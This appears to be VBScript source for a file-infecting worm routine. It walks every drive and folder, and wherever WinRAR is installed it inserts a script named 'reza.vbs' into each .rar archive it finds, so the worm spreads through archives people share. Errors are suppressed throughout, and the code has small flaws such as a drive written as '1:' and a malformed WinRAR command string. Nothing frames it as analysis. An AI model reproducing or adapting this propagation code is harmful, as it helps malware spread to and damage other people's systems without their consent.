listadriv
sub listadriv
on error resume next
Dim d,dc,s
set fso = createobject("scripting.filesystemobject")
Set dc = fso.Drives
For Each d in dc
If d.isready Then
folderlist(d.path&"\")
end if
Next
end sub

sub folderlist(folderspec)
Set fso = CreateObject("Scripting.FileSystemObject")
On Error Resume Next
set f = fso.GetFolder(folderspec)
set sf = f.SubFolders
for each f1 in sf
infectfiles(f1.path)
folderlist(f1.path)
next
end sub

sub infectfiles(folderspec)
On Error Resume Next
set f = fso.GetFolder(folderspec)
set fc = f.Files
for each f1 in fc
ext=fso.GetExtensionName(f1.path)
if (ext="rar") then
on error resume next
set ws = createobject("wscript.shell")
set fso = createobject("Scripting.filesystemobject")
rar1 = "C:\Program Files\WinRAR\WinRAR.exe"
rar2 = "D:\Program Files\WinRAR\WinRAR.exe"
rar3 = "E:\Program Files\WinRAR\WinRAR.exe"
rar4 = "F:\Program Files\WinRAR\WinRAR.exe"
rar5 = "G:\Program Files\WinRAR\WinRAR.exe"
rar6 = "H:\Program Files\WinRAR\WinRAR.exe"
rar7 = "1:\Program Files\WinRAR\WinRAR.exe"
rar8 = "J:\Program Files\WinRAR\WinRAR.exe"
rar9 = "K:\Program Files\WinRAR\WinRAR.exe"
rar0 = "L:\Program Files\WinRAR\WinRAR.exe"
if fso.fileexists(rar1) or fso.fileexists(rar2) or fso.fileexists(rar3) _
or fso.fileexists(rar4) or fso.fileexists(rar5)  or fso.fileexists(rar6) _
or fso.fileexists(rar7) or fso.fileexists(rar8) or fso.fileexists(rar9) _
or fso.fileexists(rar0) then
ws.run "WinRAR.exe a " & f1.path & "c:\reza.vbs"
end if
end if
next
end sub